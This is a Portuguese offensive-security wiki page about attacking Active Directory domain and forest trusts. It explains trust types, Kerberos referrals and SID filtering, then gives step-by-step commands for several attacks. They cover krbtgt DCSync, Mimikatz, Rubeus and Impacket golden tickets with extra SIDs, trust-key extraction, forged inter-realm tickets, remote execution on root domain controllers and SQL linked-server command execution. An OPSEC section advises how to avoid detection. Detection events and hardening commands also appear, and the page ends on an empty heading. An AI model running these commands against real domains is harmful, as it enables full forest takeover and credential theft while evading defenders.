---
layout: cyber
section: active-directory
title: "Forest e Domain Trusts — Enumeração, Exploração e Movimentação Cross-Forest"
---

# Forest e Domain Trusts — Enumeração, Exploração e Movimentação Cross-Forest

# O que é?

Active Directory Trust é um relacionamento de autenticação configurado entre domínios e/ou forests que permite que usuários autenticados em um domínio sejam reconhecidos e autorizados em outro. Tecnicamente, um trust estabelece que o KDC (Key Distribution Center) de um domínio confia nos tickets Kerberos emitidos pelo KDC de outro domínio — porque ambos compartilham uma **chave de inter-realm** (trust key).

**Estrutura fundamental:**
```
Domínio A (confia em B)           Domínio B (confiado por A)
┌───────────────────┐             ┌───────────────────┐
│  KDC-A            │             │  KDC-B            │
│                   │◄── Trust ──►│                   │
│  Trust Key: K_AB  │             │  Trust Key: K_AB  │
└───────────────────┘             └───────────────────┘
         │                                │
  [Usuários de A]                  [Usuários de B]
  podem ser autorizados           podem ser autorizados
  em recursos de B                em recursos de A
  (se trust permite)              (se trust permite)
```

A trust key K_AB é uma senha compartilhada (e sua derivação em AES/RC4) que permite ao KDC de B validar tickets emitidos por A e vice-versa. Essa chave é rotacionada automaticamente a cada 30 dias e armazenada no LSA Secrets de cada DC participante.

**Tipos de trust por mecanismo de criação:**

| Tipo | Criação | Bidirecional | Transitivo | SID Filtering padrão |
|------|---------|-------------|-----------|----------------------|
| Parent-Child | Automático (novo child domain) | Sim | Sim | Desabilitado |
| Tree-Root | Automático (nova árvore na forest) | Sim | Sim | Desabilitado |
| External | Manual | Configurável | Não | Habilitado |
| Forest Trust | Manual (Enterprise Admins) | Configurável | Dentro de cada forest | Habilitado |
| Shortcut | Manual (otimização) | Configurável | Não altera | Desabilitado |
| Realm | Manual (Kerberos não-Windows) | Configurável | Configurável | Variável |

**Propriedades críticas:**

**Direction (direção):**
```
One-way (Inbound):   A confia em B → usuários de B acessam recursos de A
One-way (Outbound):  B confia em A → usuários de A acessam recursos de B
Bidirectional:       A confia em B E B confia em A → acesso mútuo
```

**Transitivity (transitividade):**
```
Transitivo: A-trusts-B + B-trusts-C → A reconhece C
  (todos os trusts dentro de uma forest são transitivos)

Não-transitivo: A-trusts-B + B-trusts-C → A NÃO reconhece C
  (External Trusts são não-transitivos por padrão)
```

**SID Filtering (Quarantine):**
Mecanismo de segurança que remove SIDs de outros domínios ao cruzar a fronteira de trust. É a principal proteção contra ataques SID History cross-domain. SID Filtering está **desabilitado** dentro de uma forest (trusts parent-child, tree-root) porque a forest é considerada uma única unidade administrativa, e **habilitado** por padrão em External Trusts e Forest Trusts.

**Objetos TDO (Trusted Domain Objects):**
Cada trust é representado por um objeto `trustedDomain` armazenado em `CN=System,DC=domain,DC=com`. Esse objeto contém metadados do trust, a direção, o tipo, e as trust keys cifradas. Qualquer usuário autenticado pode ler atributos básicos dos TDOs via LDAP.

# Onde é implementado?

Trusts estão presentes em praticamente toda organização corporativa de médio/grande porte com infraestrutura Windows. Raramente existe empresa Fortune 500 com apenas um domínio AD — a realidade é de múltiplos domínios conectados por trusts em configurações variadas.

**Cenários enterprise onde trusts são criados:**

**1. M&A (Fusões e Aquisições) — cenário mais comum:**
```
Empresa CORP.COM adquire ACQUIRED.COM
  → Forest Trust bidirecional: CORP.COM ←→ ACQUIRED.COM
  → Razão: não migrar todos os usuários imediatamente
  → Duração: frequentemente permanece por anos ou décadas
  → Risco: cada forest tem seu próprio conjunto de Domain Admins;
    compromisso de ACQUIRED.COM pode afetar CORP.COM se SID Filtering estiver misconfigured
```

**2. Multi-divisão (múltiplas subsidiárias):**
```
Forest raiz: CORP.COM
  ├── EUROPE.CORP.COM (child domain — Parent-Child trust automático)
  │   └── UK.EUROPE.CORP.COM (child domain)
  ├── AMERICAS.CORP.COM (child domain)
  └── ASIA.CORP.COM (child domain)

→ Todos os trusts parent-child são automáticos, bidirecionais, transitivos
→ SID Filtering DESABILITADO (mesma forest)
→ Comprometer qualquer child domain = caminho para root domain
```

**3. Parceiros e fornecedores com acesso a recursos internos:**
```
CORP.COM ──(External Trust, one-way)──► PARTNER.COM
→ Usuários de PARTNER.COM podem acessar apenas recursos específicos em CORP.COM
→ SID Filtering habilitado por padrão
→ Non-transitive: PARTNER.COM não acessa outros domínios da forest de CORP
```

**4. Ambiente DMZ e redes segregadas:**
```
INTERNAL.CORP.COM ──(External Trust)──► DMZ.CORP.COM
→ Servidores web na DMZ precisam autenticar usuários internos
→ External Trust one-way: usuários internos acessam recursos DMZ
→ Comum em ambientes com PCI-DSS ou segmentação regulatória
```

**5. Domínios legados pós-migração:**
```
OLDCORP.COM ──(Forest Trust)──► NEWCORP.COM
→ Migração em andamento: usuários sendo movidos gradualmente
→ Trust mantido durante transição para continuidade de acesso
→ SID History usada para preservar permissões em recursos do domínio antigo
→ Trust frequentemente esquecido após migração "completada" mas não permanece ativo por anos
```

**Escala em grandes organizações:**
Em uma empresa Fortune 100 típica, é comum encontrar:
- 1 forest raiz com 5-20 child domains (divisões regionais ou funcionais)
- 3-10 forest trusts externos (empresas adquiridas ao longo dos anos)
- Shortcut trusts em algumas combinações de child domains para otimização
- External trusts com parceiros de negócio para acesso a portais colaborativos

Cada trust representa uma fronteira de segurança potencialmente porosa. A complexidade acumulada de trusts em organizações maduras é frequentemente tão grande que nem os próprios administradores têm visibilidade completa de todas as relações.

# Como funciona de forma adequada?

O mecanismo técnico pelo qual tickets Kerberos cruzam fronteiras de trust é o processo de **referral** (encaminhamento). O KDC de um domínio não emite tickets para serviços em outros domínios — em vez disso, emite um **Referral Ticket** (também chamado de inter-realm TGT) que o cliente usa para solicitar tickets no KDC do domínio alvo.

**Fluxo de autenticação cross-domain (inter-realm):**

```
Usuário em DOMAIN-A quer acessar FILE-SERVER em DOMAIN-B

[Passo 1] Usuário tem TGT de DOMAIN-A (obtido no login normal)

[Passo 2] Usuário solicita acesso a CIFS/fileserver.DOMAIN-B.COM ao KDC-A
┌─────────┐  TGS-REQ: quero ticket para CIFS/fileserver.DOMAIN-B.COM    ┌───────┐
│ Cliente │ ─────────────────────────────────────────────────────────►  │ KDC-A │
└─────────┘                                                             └───────┘

[Passo 3] KDC-A não tem chave para DOMAIN-B — emite Referral Ticket
          O Referral Ticket é cifrado com a TRUST KEY compartilhada entre
          KDC-A e KDC-B (não com a chave de sessão do usuário)

┌─────────┐  TGS-REP: Referral Ticket para krbtgt/DOMAIN-B              ┌───────┐
│ Cliente │ ◄─────────────────────────────────────────────────────────   │ KDC-A │
└─────────┘  (cifrado com trust key K_AB)                               └───────┘

[Passo 4] Cliente apresenta Referral Ticket ao KDC-B
┌─────────┐  TGS-REQ: (Referral Ticket + pedido de CIFS/fileserver)     ┌───────┐
│ Cliente │ ─────────────────────────────────────────────────────────►  │ KDC-B │
└─────────┘                                                             └───────┘

[Passo 5] KDC-B decifra Referral Ticket com trust key K_AB
          Verifica identidade do usuário e emite TGS final

┌─────────┐  TGS-REP: TGS para CIFS/fileserver.DOMAIN-B.COM             ┌───────┐
│ Cliente │ ◄─────────────────────────────────────────────────────────   │ KDC-B │
└─────────┘  (cifrado com chave do FILE-SERVER)                         └───────┘

[Passo 6] Cliente usa TGS para acessar FILE-SERVER
┌─────────┐  AP-REQ: TGS de DOMAIN-B para CIFS/fileserver               ┌──────────┐
│ Cliente │ ─────────────────────────────────────────────────────────►  │FILE-SERVER│
└─────────┘                                                             └──────────┘
```

**Trust Keys — onde são armazenadas:**
```
Em cada DC participante do trust:
  → LSA Secrets (registro cifrado): a trust password corrente e a anterior
  → Objeto TDO no AD: versão cifrada das chaves (legível pelo sistema)

A trust password é tratada como uma "conta de usuário" especial:
  → Conta com nome do domínio upstream + "$" (ex: CORP$ no child domain)
  → Password rotaciona automaticamente a cada 30 dias
  → Armazenada com duas versões: corrente e anterior (para tolerância durante rotação)
```

**SID Filtering em detalhe:**

SID Filtering é implementado no KDC-B ao processar Referral Tickets de KDC-A. Quando SID Filtering está habilitado:

```
Ticket do usuário X de DOMAIN-A contém no PAC:
  → Primary SID: S-1-5-21-DOMAIN-A-...-RID (aceito pelo KDC-B)
  → SID History: S-1-5-21-DOMAIN-B-...-519 (Enterprise Admins de B)
                              ↓
  [SID Filtering HABILITADO]
  KDC-B remove o SID History de DOMAIN-B
  Resultado: usuário X acessa DOMAIN-B apenas com suas permissões em DOMAIN-A

  [SID Filtering DESABILITADO — dentro da forest]
  KDC-B aceita o SID History
  Resultado: usuário X é tratado como Enterprise Admin em DOMAIN-B
             → comprometimento total da forest se atacante controla DOMAIN-A
```

**SID History — propósito legítimo:**

O atributo `sIDHistory` existe para suportar **migrações de usuários entre domínios**:

```
Migração: usuário JOHN de OLD.CORP.COM para NEW.CORP.COM

Antes da migração:
  → John tem SID S-1-5-21-OLD-...-1234
  → Recursos em OLD.CORP.COM têm ACLs com SID S-1-5-21-OLD-...-1234

Após migração:
  → John recebe novo SID em NEW.CORP.COM: S-1-5-21-NEW-...-5678
  → sIDHistory de John em NEW: [S-1-5-21-OLD-...-1234]
  → KDC inclui ambos os SIDs no PAC
  → John ainda pode acessar recursos em OLD.CORP.COM com seu SID antigo
  → Administradores têm tempo para atualizar ACLs gradualmente
```

**Configuração de SID Filtering via netdom:**
```powershell
# Verificar estado atual do SID Filtering num trust
netdom trust CORP.COM /domain:PARTNER.COM /quarantine
# Resultado: "SID filter quarantining is enabled on this trust."
# OU "SID filter quarantining is disabled on this trust."

# Habilitar SID Filtering (se estava desabilitado por engano)
netdom trust CORP.COM /domain:PARTNER.COM /quarantine:yes /usero:admin /passwordo:*

# Verificar via PowerShell (AD Module):
Get-ADTrust -Filter * | Select-Object Name, SIDFilteringQuarantined, SIDFilteringForestAware
# SIDFilteringQuarantined = True  → Habilitado (mais seguro)
# SIDFilteringQuarantined = False → Desabilitado (risco para ataques SID History)
```

**Selective Authentication — controle granular em Forest Trusts:**
Quando um Forest Trust é configurado com **Selective Authentication**, usuários do forest trusted não têm acesso automático a recursos no forest trusting. Em vez disso, cada recurso (servidor) precisa ter explicitamente o direito "Allowed to Authenticate" concedido para usuários do domínio externo. Isso limita o raio de blast de um comprometimento cross-forest.

```powershell
# Configurar Selective Authentication num Forest Trust
# (via GUI: Domain and Trusts → propriedades do trust → Authentication)
# Ou via netdom:
netdom trust CORP.COM /domain:PARTNER.COM /selectiveauth:yes /usero:admin /passwordo:*
```

---

## Estrutura, Direção e Transitividade

### Conceitos Fundamentais de Trust

Um **trust** é uma relação de autenticação entre dois domínios. Quando um domínio A confia no domínio B:
- Usuários autenticados em B podem ser autorizados em A
- O KDC de A aceita tickets emitidos pelo KDC de B (usando uma chave compartilhada de inter-realm)
- A confiança não implica autorização automática — apenas que a identidade é aceita

**Componentes de um trust:**
1. **Trusted Domain Object (TDO)**: objeto AD do tipo `trustedDomain` armazenado em `CN=System,DC=domain,DC=com`
2. **Trust Password / Inter-Realm Key**: chave compartilhada entre os dois domínios, usada para cifrar tickets cross-realm
3. **Trust Direction**: Incoming (confia em B), Outgoing (B confia em A), ou Bidirectional
4. **Trust Transitivity**: se o trust se propaga para outros domínios na cadeia

### Tipos de Trust em Detalhe

#### Parent-Child Trust

```
Exemplo: CHILD.CORP.COM ←→ CORP.COM (parent)

Características:
- Criado AUTOMATICAMENTE quando novo child domain é criado na floresta
- Sempre bidirecional (ambos os domínios confiam no outro)
- Transitivo (propaga-se para outros domínios da floresta)
- SID Filtering DESABILITADO por padrão (dentro da mesma floresta é assim)
- Compartilham a mesma Global Catalog e Schema
```

**Implicação de segurança**: Um atacante que compromete o child domain pode usar SID History para escalar ao root domain, pois SID Filtering está desabilitado.

#### Tree-Root Trust

```
Exemplo: SUBSIDIARY.COM ←→ CORP.COM (dentro da mesma floresta, árvore diferente)

Características:
- Criado automaticamente quando nova árvore de domínio é adicionada à floresta existente
- Sempre bidirecional
- Transitivo dentro da floresta
- SID Filtering desabilitado (mesma floresta)
```

#### External Trust

```
Exemplo: CORP.COM → PARTNER.COM (empresa parceira, floresta separada)

Características:
- Criado MANUALMENTE por administradores
- Unidirecional ou bidirecional (configurável)
- NÃO transitivo — A→B e B→C NÃO implica A→C
- SID Filtering habilitado por padrão
- "Quarantined" — SIDs externos são filtrados
- Caso de uso: acesso limitado a recursos entre empresas parceiras
```

#### Forest Trust

```
Exemplo: CORP.COM ←→ ACQUIRED-COMPANY.COM (duas florestas distintas)

Características:
- Criado MANUALMENTE por Enterprise Admins de ambas as florestas
- Pode ser unidirecional ou bidirecional
- Transitivo DENTRO de cada floresta, mas NÃO automaticamente entre florestas
  (CORP.COM ←→ ACQUIRED.COM, CORP.COM ←→ PARTNER.COM NÃO implica ACQUIRED.COM ←→ PARTNER.COM)
- SID Filtering habilitado por padrão
- Pode ser configurado com "Selective Authentication" para granularidade adicional
```

#### Shortcut Trust

```
Exemplo: EUROPE.CORP.COM ←→ ASIA.CORP.COM (dentro da mesma floresta)

Características:
- Criado manualmente para otimizar performance em florestas grandes
- Sem shortcut: autenticação EUROPE→ASIA passa pelo root forest domain
- Com shortcut: autenticação direta entre os dois domínios
- Tipo: bidirecional ou unidirecional
- Não altera o modelo de segurança — apenas melhora latência de autenticação
```

#### Realm Trust

```
Exemplo: CORP.COM ↔ UNIX.REALM.MIT.EDU

Características:
- Para interoperabilidade com MIT Kerberos (não-Windows)
- Pode ser transitivo ou não-transitivo
- Usado em ambientes híbridos Unix/Windows
- Exploração geralmente envolve forjar tickets MIT Kerberos
```

### Transitivity e Seus Impactos

**Regra**: Um trust transitivo significa que se A confia em B e B confia em C, então A confia transitivamente em C.

```
Floresta CORP.COM:
    CORP.COM (root)
    ├── EUROPE.CORP.COM (child)
    │   └── UK.EUROPE.CORP.COM (child)
    └── ASIA.CORP.COM (child)

Trust automáticos:
CORP.COM ←→ EUROPE.CORP.COM (parent-child, transitivo)
EUROPE.CORP.COM ←→ UK.EUROPE.CORP.COM (parent-child, transitivo)
CORP.COM ←→ ASIA.CORP.COM (parent-child, transitivo)

Transitividade implícita:
UK.EUROPE.CORP.COM pode autenticar em ASIA.CORP.COM via cadeia de trusts
```

**Impacto para o atacante**: Comprometer qualquer domínio da floresta com SID Filtering desabilitado = caminho para comprometer o root domain = comprometer Enterprise Admins = comprometer toda a floresta.

### SID Filtering — A Principal Defesa

SID Filtering (também chamada de "Quarantine") é um mecanismo que **filtra SIDs externos** de tickets Kerberos ao cruzar boundaries de trust.

**Como funciona:**
- Quando um ticket cruza um trust, o KDC do domínio receptor verifica os SIDs no ticket
- SIDs do domínio emissor são aceitos
- SIDs de OUTROS domínios na SID History são removidos (filtrados)
- Isso impede que um atacante injete SIDs de grupos privilegiados de outros domínios

**Status padrão por tipo de trust:**

| Tipo de Trust | SID Filtering Padrão |
|---|---|
| Parent-Child (mesma floresta) | DESABILITADO |
| Tree-Root (mesma floresta) | DESABILITADO |
| External Trust | HABILITADO |
| Forest Trust | HABILITADO |
| Shortcut Trust | DESABILITADO |

**Verificar se SID Filtering está habilitado:**
```powershell
# PowerView
Get-DomainTrust | Select-Object TargetName, TrustDirection, TrustType, SIDFilteringQuarantined, SIDFilteringForestAware

# Netdom (ferramenta nativa):
netdom trust DOMAIN.COM /domain:TRUSTED.COM /quarantine
# Retorna: "SID filtering is enabled" ou "SID filtering is disabled"

# AD Module:
Get-ADTrust -Filter * | Select-Object Name, Direction, SIDFilteringQuarantined, SIDFilteringForestAware
```

### SID History — O Vetor de Ataque

O atributo `sIDHistory` em objetos de usuário/grupo existe para suportar migrações de domínio:
- Quando um usuário é migrado de um domínio A para domínio B, o SID original (de A) é adicionado ao `sIDHistory` no novo objeto em B
- O KDC inclui SIDs do `sIDHistory` no ticket PAC (Privilege Attribute Certificate)
- O servidor de recursos verifica TODOS os SIDs no PAC para autorização — incluindo os de SIDHistory

**Abuso**: Se um atacante adiciona o SID do grupo `Enterprise Admins` do domínio raiz ao `sIDHistory` de uma conta no domínio filho, e SID Filtering está desabilitado, essa conta terá privilégios de Enterprise Admin na floresta inteira.

```
Atacante controla CHILD.CORP.COM:
1. Adicionar SID de Enterprise Admins (S-1-5-21-ROOT-SID-519) ao sIDHistory de conta em CHILD
2. Com SID Filtering desabilitado: CORP.COM aceita esse SID no PAC
3. Resultado: conta no CHILD domain tem Enterprise Admin privileges no ROOT domain
```

### Inter-Realm Tickets (Referral Tickets)

Quando um usuário em DOMAIN-A tenta acessar recurso em DOMAIN-B (via trust):

```
1. Cliente solicita TGS para serviço em DOMAIN-B ao KDC de DOMAIN-A
2. KDC de DOMAIN-A não tem chave de DOMAIN-B
3. KDC de DOMAIN-A emite Referral Ticket (TGS) cifrado com a Inter-Realm Key (trust password)
4. Cliente apresenta Referral Ticket ao KDC de DOMAIN-B
5. KDC de DOMAIN-B decifra com Inter-Realm Key e emite TGS final para o serviço
```

**Implicação ofensiva**: Se o atacante obtiver a **trust password** (armazenada no TDO), pode forjar Referral Tickets para qualquer usuário de qualquer domínio que esse trust conecta.

---

## Na Prática

### Enumeração de Trusts

```powershell
# PowerView — trust do domínio atual
Get-DomainTrust

# PowerView — trusts de domínio específico
Get-DomainTrust -Domain DOMAIN.COM

# PowerView — trusts de todos os domínios alcançáveis
Get-ForestTrust
Get-ForestDomain | ForEach-Object { Get-DomainTrust -Domain $_.Name }

# Nativo do .NET — rápido, sem ferramentas externas
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# Para floresta inteira:
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

# Nltest (nativo do Windows):
nltest /domain_trusts /all_trusts
nltest /trusted_domains

# AD Module:
Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType, SIDFilteringQuarantined

# Para domínio específico:
Get-ADTrust -Identity CORP.COM | Select-Object *
```

**Output de Get-DomainTrust — campos importantes:**
```
SourceName        : CHILD.CORP.COM
TargetName        : CORP.COM
TrustType         : WITHIN_FOREST     # ou WINDOWS_NON_ACTIVE_DIRECTORY, FOREST_TRANSITIVE
TrustDirection    : Bidirectional     # Inbound, Outbound, Bidirectional
WhenCreated       : 1/1/2020 12:00:00 AM
WhenChanged       : 1/1/2020 12:00:00 AM
SIDFilteringForestAware    : False
SIDFilteringQuarantined    : False    # FALSE = SID Filtering DESABILITADO
```

### Enumeração de Domínios e Recursos Cross-Forest

```powershell
# Listar todos os domínios da floresta
Get-ForestDomain

# Enumerar usuários em domínio específico (requer trust bidirecional ou credenciais)
Get-DomainUser -Domain PARTNER.COM

# Enumerar computadores em domínio externo
Get-DomainComputer -Domain PARTNER.COM

# Enumerar grupos em floresta externa
Get-DomainGroup -Domain PARTNER.COM | Where-Object {$_.GroupScope -eq 'Universal'}

# Encontrar grupos com acesso cross-forest (Foreign Security Principals)
Get-DomainForeignGroupMember -Domain CORP.COM
Get-DomainForeignUser -Domain CORP.COM

# Encontrar usuários de um domínio que são membros de grupos em outro domínio
Get-DomainTrustMapping  # Enumera automaticamente todos os trusts alcançáveis

# Listar Global Catalog servers (conhecem objetos de todos os domínios da floresta)
Get-DomainController -Domain CORP.COM | Where-Object {$_.GlobalCatalog -eq $true}
```

**Com Impacket (Linux, sem estar no domínio):**
```bash
# Enumerar trusts via LDAP
python3 /opt/impacket/examples/ldapdomaindump.py \
    -u 'domain\user' -p 'password' \
    DC_IP

# Enumerar via rpcclient
rpcclient -U "domain/user%password" DC_IP -c "enumdomtrusts"

# bloodhound-python para coleta cross-domain
python3 -m bloodhound \
    -u user -p password -d CHILD.CORP.COM \
    -dc DC.CHILD.CORP.COM \
    --zip \
    -c All \
    --disable-pooling
```

---

## Exemplos de Código / Comandos

### Ataque Cross-Domain com SID History (Intra-Forest)

**Pré-requisitos:**
1. Controle do domínio filho (krbtgt hash do child domain)
2. SID do grupo Enterprise Admins do root domain
3. SID Filtering desabilitado no trust parent-child (padrão)

```powershell
# PASSO 1: Obter krbtgt hash do domínio filho (DCSync no child domain)
mimikatz# lsadump::dcsync /domain:CHILD.CORP.COM /user:krbtgt
# Anotar: NTLM hash e AES256 hash do krbtgt do child domain

# PASSO 2: Obter SID do domínio filho
mimikatz# lsadump::dcsync /domain:CHILD.CORP.COM /user:Administrator
# Ou:
(Get-DomainSID -Domain CHILD.CORP.COM)

# PASSO 3: Obter SID do grupo Enterprise Admins do root domain
# Enterprise Admins SID = ROOT_DOMAIN_SID + "-519"
$rootSID = (Get-DomainSID -Domain CORP.COM)
$enterpriseAdminsSID = "$rootSID-519"
Write-Host "Enterprise Admins SID: $enterpriseAdminsSID"

# Alternativa: buscar diretamente
(Get-DomainGroup "Enterprise Admins" -Domain CORP.COM).objectsid

# PASSO 4: Criar Golden Ticket com ExtraSIDs
# Mimikatz — inclui SID do Enterprise Admins no campo ExtraSIDs do PAC
mimikatz# kerberos::golden \
    /user:Administrator \
    /domain:CHILD.CORP.COM \
    /sid:S-1-5-21-CHILD-SID \
    /krbtgt:KRBTGT_NTLM_HASH \
    /sids:S-1-5-21-ROOT-SID-519 \
    /ptt

# Verificar que ticket foi injetado e tem Enterprise Admins SID:
klist

# Testar acesso ao root domain:
dir \\ROOTDC.CORP.COM\c$
PsExec.exe \\ROOTDC.CORP.COM cmd.exe

# DCSync no root domain:
mimikatz# lsadump::dcsync /domain:CORP.COM /user:krbtgt

# PASSO 5 (opcional): Usar Rubeus para o mesmo ataque
Rubeus.exe golden \
    /user:Administrator \
    /domain:CHILD.CORP.COM \
    /sid:S-1-5-21-CHILD-SID \
    /krbtgt:KRBTGT_NTLM_HASH \
    /sids:S-1-5-21-ROOT-SID-519 \
    /ptt
```

**Com Impacket (Linux):**
```bash
# Criar Golden Ticket com ExtraSIDs
impacket-ticketer \
    -nthash KRBTGT_NTLM_HASH \
    -domain-sid S-1-5-21-CHILD-SID \
    -domain CHILD.CORP.COM \
    -extra-sid S-1-5-21-ROOT-SID-519 \
    Administrator

export KRB5CCNAME=Administrator.ccache

# Acessar root domain DC
impacket-secretsdump -k -no-pass CORP.COM/Administrator@ROOTDC.CORP.COM
impacket-wmiexec -k -no-pass CORP.COM/Administrator@ROOTDC.CORP.COM
```

### Extração e Abuso de Trust Keys

A trust password é armazenada em dois locais:
1. Como conta de usuário com nome terminando em `$` no AD (ex: `CHILD$`)
2. No LSA Secrets do DC

```cmd
# Mimikatz — extrair trust keys do LSA Secrets (requer SYSTEM no DC)
mimikatz# lsadump::trust /patch

# Output:
# [ Out ] CORP.COM -> CHILD.CORP.COM
# * aes256_hmac       : [AES256 KEY]
# * rc4_hmac_nt       : [RC4/NTLM KEY]  <- Esta é a trust password hash

# Alternativa: DCSync para a conta de trust
# A conta de trust tem nome do domínio upstream com $
mimikatz# lsadump::dcsync /domain:CHILD.CORP.COM /user:CORP$

# Com o trust key, forjar Referral Ticket (inter-realm TGT):
mimikatz# kerberos::golden \
    /user:Administrator \
    /domain:CHILD.CORP.COM \
    /sid:S-1-5-21-CHILD-SID \
    /sids:S-1-5-21-ROOT-SID-519 \
    /rc4:TRUST_KEY_RC4 \
    /service:krbtgt \
    /target:CORP.COM \
    /ticket:cross_realm.kirbi

# Usar o Referral Ticket para obter TGS no root domain:
Rubeus.exe asktgs \
    /ticket:cross_realm.kirbi \
    /service:cifs/ROOTDC.CORP.COM \
    /dc:ROOTDC.CORP.COM \
    /ptt
```

### Ataque Cross-Forest (Forest Trust)

**Pré-requisito**: Forest Trust bidirecional entre CORP.COM e PARTNER.COM, SID Filtering desabilitado (ou via SIDHistory).

```powershell
# PASSO 1: Enumerar SIDs de grupos privilegiados na floresta alvo
Get-DomainGroup -Domain PARTNER.COM | Where-Object {$_.admincount -eq 1}
(Get-DomainGroup "Domain Admins" -Domain PARTNER.COM).objectsid

# PASSO 2: Obter trust key para PARTNER.COM
# (requer SYSTEM no DC de CORP.COM que tem o trust com PARTNER.COM)
mimikatz# lsadump::trust /patch

# PASSO 3: Forjar inter-realm ticket
# Nota: Cross-FOREST com SID Filtering habilitado NÃO funciona com ExtraSIDs de outro forest
# Funciona apenas se SID Filtering estiver desabilitado no forest trust

mimikatz# kerberos::golden \
    /user:Administrator \
    /domain:CORP.COM \
    /sid:S-1-5-21-CORP-SID \
    /rc4:FOREST_TRUST_KEY \
    /service:krbtgt \
    /target:PARTNER.COM \
    /sids:S-1-5-21-PARTNER-SID-519 \
    /ticket:forest_cross.kirbi

Rubeus.exe asktgs \
    /ticket:forest_cross.kirbi \
    /service:cifs/PARTNERDC.PARTNER.COM \
    /dc:PARTNERDC.PARTNER.COM \
    /ptt

dir \\PARTNERDC.PARTNER.COM\c$
```

**Verificar se SID Filtering está realmente desabilitado em forest trust:**
```powershell
# Se SIDFilteringQuarantined = False E o trust type é FOREST_TRANSITIVE:
# Significa que forest trust foi configurado sem SID Filtering
Get-DomainTrust -Domain CORP.COM | 
    Where-Object {$_.TrustType -eq 'FOREST_TRANSITIVE'} |
    Select-Object TargetName, SIDFilteringQuarantined, SIDFilteringForestAware

# Desabilitar SID Filtering (requer Enterprise Admin — para simular misconfiguration):
netdom trust CORP.COM /domain:PARTNER.COM /quarantine:No /usero:admin /passwordo:pass
```

### Pivoting Cross-Forest via Linked SQL Server

SQL Server com linked server apontando para outra forest — quando as credenciais do linked server têm privilégios — permite pivotar entre forests sem Kerberos delegation.

```sql
-- SQL Server na forest A com linked server na forest B
-- Se linked server usa credenciais fixas ou trust → pivotar entre forests

-- Verificar contexto de segurança do linked server
EXEC sp_helplinkedsrvlogin

-- Executar comando na forest B via linked server
EXEC ('xp_cmdshell ''whoami''') AT SQL_FOREST_B

-- Verificar servidor remoto
EXEC ('SELECT @@servername, SYSTEM_USER') AT SQL_FOREST_B
```

Útil quando: forest trust não existe mas SQL linked server foi configurado com credenciais explícitas entre forests — bypass de SID Filtering via camada de aplicação.

### Enumeração e Mapeamento com BloodHound

**SharpHound coleta cross-domain:**
```cmd
# Coletar dados de múltiplos domínios em um único zip
SharpHound.exe --CollectionMethods All --Domain CORP.COM --OutputDirectory C:\temp
SharpHound.exe --CollectionMethods All --Domain CHILD.CORP.COM --OutputDirectory C:\temp
SharpHound.exe --CollectionMethods All --Domain PARTNER.COM --OutputDirectory C:\temp

# Coletar tudo de uma vez (detecta trusts automaticamente):
SharpHound.exe --CollectionMethods All --Domain CORP.COM --SearchForest --OutputDirectory C:\temp
```

**Queries Cypher para trusts:**
```cypher
-- Listar todos os trusts de domínio
MATCH (d:Domain)-[r:TrustedBy|Trusts]->(d2:Domain)
RETURN d.name, type(r), d2.name

-- Encontrar caminhos cross-domain
MATCH p=shortestPath((u:User)-[*1..]->(d:Domain))
RETURN p LIMIT 10

-- Domínios com trusts que NÃO têm SID Filtering
MATCH (d:Domain)-[r:TrustedBy]->(d2:Domain)
WHERE r.sidfiltering = false
RETURN d.name, d2.name, r.sidfiltering

-- Caminhos do usuário comprometido até Domain Admin em qualquer domínio
MATCH p=shortestPath((u:User {name:"COMPROMISED@CHILD.CORP.COM"})-[*1..]->(g:Group))
WHERE g.name CONTAINS "DOMAIN ADMINS"
RETURN p

-- Usuários com Foreign Security Principal membership (acesso cross-domain)
MATCH (u:User)-[:MemberOf]->(g:Group)
WHERE u.domain <> g.domain
RETURN u.name, u.domain, g.name, g.domain
```

### Lateral Movement Cross-Domain

Uma vez com tickets cross-domain:

```bash
# Enumerar recursos no domínio de destino
impacket-smbclient -k -no-pass CORP.COM/Administrator@ROOTDC.CORP.COM

# Executar comandos remotos
impacket-wmiexec -k -no-pass CORP.COM/Administrator@ROOTDC.CORP.COM

# DCSync no domínio de destino
impacket-secretsdump -k -no-pass CORP.COM/Administrator@ROOTDC.CORP.COM

# Enumerate via LDAP no domínio de destino
ldapsearch -H ldap://ROOTDC.CORP.COM -Y GSSAPI -b "DC=CORP,DC=COM" "(objectClass=user)" cn

# PowerShell remoting cross-domain (com ticket injetado)
Enter-PSSession -ComputerName ROOTDC.CORP.COM -Authentication Kerberos
```

---

## Detecção e OPSEC

### Indicadores de Comprometimento

**Golden Ticket com ExtraSIDs:**
- Evento 4624 — Logon com SID de Enterprise Admins que não é membro do grupo no AD
- Evento 4672 (Special Logon) — Privilégios especiais atribuídos a conta de outro domínio
- Correlação: usuário de CHILD.CORP.COM acessando recursos de CORP.COM com privilégios de Enterprise Admin
- Microsoft ATA/Defender for Identity: alerta específico para "Kerberos Golden Ticket"

**Extração de Trust Keys:**
- Evento 4662 — Operação executada em objeto `trustedDomain` com permissões de replicação
- Evento 4688 — Criação de processo mimikatz, cobalt strike, etc.
- Evento 5145 — Acesso a PIPE\lsass

**Enumeração de Trusts:**
- Consultas LDAP ao atributo `trustedDomain` — pode ser detectado via AD auditing
- Chamadas a `NetEnumerateTrustedDomains` — detectável via sysmon
- `nltest /domain_trusts` gera evento de processo suspeito se houver baseline

### Técnicas de OPSEC

**Enumeração:**
```powershell
# Usar .NET direto em vez de PowerView (menos assinaturas)
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

# Consulta LDAP direta (mais furtivo que Get-DomainTrust):
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(objectClass=trustedDomain)"
$searcher.PropertiesToLoad.Add("cn") | Out-Null
$searcher.FindAll() | ForEach-Object { $_.Properties["cn"] }
```

**Ataque com ExtraSIDs:**
- Usar AES256 para forjar Golden Ticket em vez de RC4 (mais difícil de detectar)
- Executar uma única vez — múltiplos tickets forjados criam padrão suspeito
- Injetar apenas para a sessão necessária (`/ptt`) em vez de escrever em arquivo
- Executar o attack em horário de trabalho quando há tráfego legítimo cross-domain

**Persistência cross-forest:**
```
1. Não criar contas novas no forest de destino — usar identidades existentes
2. Preferir usar trust key para forjar referral tickets em vez de Golden Ticket
   -- Trust keys mudam periodicamente (30 dias padrão) mas Golden Ticket expira mais cedo
3. Documentar (internamente) a rota de acesso para reexecução rápida
```

**Detectar se está sendo monitorado:**
